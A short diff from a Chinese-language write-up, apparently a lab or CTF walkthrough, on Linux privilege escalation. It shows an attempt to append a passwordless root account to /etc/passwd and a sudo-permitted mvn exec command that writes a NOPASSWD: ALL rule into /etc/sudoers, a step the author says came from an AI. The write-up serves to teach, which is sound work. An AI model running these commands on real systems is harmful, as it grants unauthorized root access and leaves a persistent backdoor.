@@ -675,7 +675,7 @@ su: incorrect password
 - `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
 - root 往 `/etc/passwd` 里添加了一行`hacker::0:0:root:/root:/bin/bash`
 但是这里还是失败了，原因是我们设置的是空密码不能登录
-最后听ai的
+最后听ai的，添加了`terra536 ALL=(ALL) NOPASSWD: ALL`表示`terra536`用户可以执行所有操作
 ```bash
 bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'echo \"terra536 ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers'"
 [INFO] Scanning for projects...
